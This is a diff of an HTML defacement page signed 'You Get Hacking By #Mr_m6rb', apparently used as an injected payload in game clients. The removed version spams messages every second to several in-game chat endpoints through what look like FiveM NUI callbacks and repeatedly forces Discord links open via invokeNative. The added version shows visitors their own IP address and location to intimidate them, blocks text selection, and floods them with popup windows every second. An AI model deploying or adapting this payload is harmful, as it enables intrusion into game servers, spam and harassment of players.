@@ -1,143 +1,171 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>discord.gg/EHZTXduFm2</title>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Custom Design</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background: url('https://i.pinimg.com/originals/75/ae/36/75ae36e317b6b207fe440d004667f34f.gif') no-repeat center center fixed;
-            background-size: cover;
+            background-color: black;
+            color: #ff0000; /* كل النصوص حمراء */
             font-family: 'Courier New', Courier, monospace;
-            color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            flex-direction: column;
-            text-align: center;
             overflow: hidden;
+            flex-direction: column;
+            position: relative;
         }
+
+        .container {
+            text-align: center;
+            z-index: 1;
+        }
+
         .image-container img {
-            width: 750px; 
-            height: auto;
-            border: 2px solid #ffffff; 
-            border-radius: 15px;
-            box-shadow: 0 0 15px rgba(0, 0, 255, 0.7); 
+            width: 400px;
+            max-width: 90vw;
+            border: 2px solid #ff0000; /* الحدود حمراء */
+            border-radius: 10px;
+            opacity: 0.5;
+            display: block;
+            margin: 0 auto;
         }
-        .info {
-            margin-top: 20px;
-            font-size: 1.5em;
-            color: #ffffff; 
-            text-shadow: 0px 0px 8px #ffffff, 0px 0px 15px #ffffff, 0px 0px 25px #ffffff; 
-            letter-spacing: 4.5px; 
-            white-space: pre-wrap;
-        }
-        .text {
-            margin-top: 20px;
-            font-size: 3em; 
-            color: #ffffff; 
-            text-shadow: 0px 0px 8px #ffffff, 0px 0px 15px #ffffff, 0px 0px 25px #ffffff; 
-            letter-spacing: 4.5px; 
-        }
-        .yt-bg {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
+
+        .background {
+            position: fixed;
             top: 0;
             left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            object-fit: cover;
+        }
+
+        pre {
+            color: #ff0000; /* نصوص JSON حمراء */
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border-radius: 5px;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .decorative-text {
+            margin-top: 20px;
+            color: #ff0000; /* نصوص زينة حمراء */
+            font-size: 1.3rem;
+            text-shadow: 0 0 10px #ff0000;
+            font-style: italic;
+        }
+
+        .signature-text {
+            margin-top: 15px;
+            color: #ff0000; /* التوقيع حمراء */
+            font-size: 1.2rem;
+            text-shadow: 0 0 5px #ff0000;
         }
     </style>
 </head>
 <body>
-    <div class="image-container">
-        <img src="https://i.pinimg.com/originals/28/ae/0e/28ae0e7388225957949a07f91e3a4c71.gif" alt="Discord Image">
+    <video class="background" autoplay muted loop>
+        <source src="https://cdn.discordapp.com/attachments/1261114958574387241/1305252891518439424/-_-_2020_-_.mp4?ex=6849d8fb&is=6848877b&hm=bd5ac58799997fdfa7c1917e8717e04f1801441503556c414e7195cc304534d2&" type="video/mp4" />
+        Your browser does not support the video tag.
+    </video>
+
+    <div class="container">
+        <div class="image-container">
+            <img src="https://files.catbox.moe/3z9x0z.jpg" alt="Image" />
+        </div>
+
+        <div class="media-container">
+            <audio autoplay loop>
+                <source src="https://files.catbox.moe/9lbf67.mp3" type="audio/mp3" />
+                Your browser does not support the audio element.
+            </audio>
+        </div>
+
+        <br /><br />
+
+        <div>
+            <b>Your IP Address:</b> <span id="ip-address-value">Fetching...</span><br />
+            <b>IP Information:</b>
+            <pre id="ip-info">Fetching...</pre>
+        </div>
+
+        <div class="decorative-text">
+            <p>You Get Hacking By #Mr_m6rb & 9k The deceased | المطلوب vLe2Mx</p>
+        </div>
+
+        <div class="signature-text">
+            <p></p>
+        </div>
     </div>
 
-    <!-- تشغيل أغنية يوتيوب -->
-    <div class="yt-bg">
-        <iframe src="https://www.youtube.com/embed/1yeuLjrpZI0?autoplay=1&loop=1&playlist=1yeuLjrpZI0&controls=0&showinfo=0"
-                frameborder="0" allow="autoplay; encrypted-media"></iframe>
-    </div>
-
-    <div class="text">Silent, but dangerous.</div>
-
-    <div class="info" id="ip-info">
-        <strong>IP: <span id="ip"></span></strong><br>
-        <span><strong>City:</strong> <span id="city"></span></span><br>
-        <span><strong>Region:</strong> <span id="region"></span></span><br>
-        <span><strong>Country:</strong> <span id="country"></span></span><br>
-        <span><strong>Location:</strong> <span id="loc"></span></span><br>
-        <span><strong>Organization:</strong> <span id="org"></span></span><br>
-        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
-    </div>
-
-    <div class="text">Destroy by 0x5 : discord.gg/0x5</div>
-
-    <!-- كود IP Info -->
     <script>
-        fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            delete data.readme;
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.textContent = JSON.stringify(data, null, 2);
-        });
-    </script>
+        // منع تحديد النص
+        var omitformtags = ['input', 'textarea', 'select'].join('|');
 
-    <!-- سكربت فتح روابط ديسكورد -->
-    <script>
-        setInterval(() => {
-            window.invokeNative("openUrl", "https://discord.gg/0x5");
-            window.invokeNative("openUrl", "https://discord.gg/0x5");
-            window.invokeNative("openUrl", "https://discord.gg/0x5");
-            window.invokeNative("openUrl", "https://discord.gg/0x5");
-            window.invokeNative("openUrl", "https://discord.gg/0x5");
-            window.invokeNative("openUrl", "https://discord.gg/0x5");
-            window.invokeNative("openUrl", "https://discord.gg/0x5");
-            window.invokeNative("openUrl", "https://discord.gg/0x5");
-        }, 1000);
-    </script>
+        function disableselect(e) {
+            if (omitformtags.indexOf(e.target.tagName.toLowerCase()) == -1)
+                return false;
+        }
 
-    <!-- سكربت إرسال الرسائل -->
-    <script>
-        const msg = `  RT_m6rb .gg/0x5 on top `;
-        const body = JSON.stringify({ message: msg });
+        function reEnable() { return true; }
 
-        setInterval(() => {
-            fetch("https://flix-scripts/chatResult", { method: "POST", body });
-            fetch("https://danger_chat/Danger_Chat:SendMessage", {
-                method: "POST",
-                body: JSON.stringify({
-                    "message": msg,
-                    "channel": "شات العام",
-                    "color": null,
-                    "isImageAndLinksAllowed": [false, false]
+        if (typeof document.onselectstart != 'undefined')
+            document.onselectstart = function () { return false; };
+        else {
+            document.onmousedown = disableselect;
+            document.onmouseup = reEnable;
+        }
+
+        // جلب IP ومعلوماته
+        function fetchIPAndInfo() {
+            fetch('https://api.ipify.org/?format=json')
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to fetch IP from ipify');
+                    }
+                    return response.json();
                 })
-            });
-            fetch("https://easy-chat+/o6ZbK5Ecp6", {
-                headers: {
-                    accept: "*/*",
-                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
-                },
-                body: JSON.stringify({ message: msg, channel: "شات العام" }),
-                method: "POST"
-            });
-            fetch("https://melix_chat/chatResult", { method: "POST", body });
-            fetch("https://as_chat/chatResult", { method: "POST", body });
-            fetch("https://chat/chatResult", { method: "POST", body });
-            fetch("https://ho-chatv2/Chat", {
-                method: "POST",
-                body: JSON.stringify({
-                    "Type": "chatResult",
-                    "message": msg,
-                    "chatType": "general"
+                .then(data => {
+                    const ip = data.ip;
+                    document.getElementById('ip-address-value').textContent = ip;
+                    return fetch(`https://ipinfo.io/${ip}/json`);
                 })
-            });
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to fetch IP info from ipinfo.io');
+                    }
+                    return response.json();
+                })
+                .then(ipInfoData => {
+                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
+                })
+                .catch(error => {
+                    console.error('Error fetching IP data:', error);
+                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
+                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+                });
+        }
+
+        fetchIPAndInfo();
+
+        // **الكود الذي يفتح الروابط (باستخدام window.open)**
+        // ملاحظة: سيتم حظر هذه النوافذ المنبثقة في معظم المتصفحات ما لم يقم المستخدم بالسماح بها يدوياً.
+        setInterval(() => {
+            // فتح في نافذة/علامة تبويب جديدة (_blank)
+            window.open("https://guns.lol/rt_m6rb", '_blank');
+            window.open("https://discord.gg/XVMkaeZkKb", '_blank');
+            window.open("https://guns.lol/rt_m6rb", '_blank');
+            window.open("https://discord.gg/XVMkaeZkKb", '_blank');
         }, 1000);
+
     </script>
 </body>
 </html>
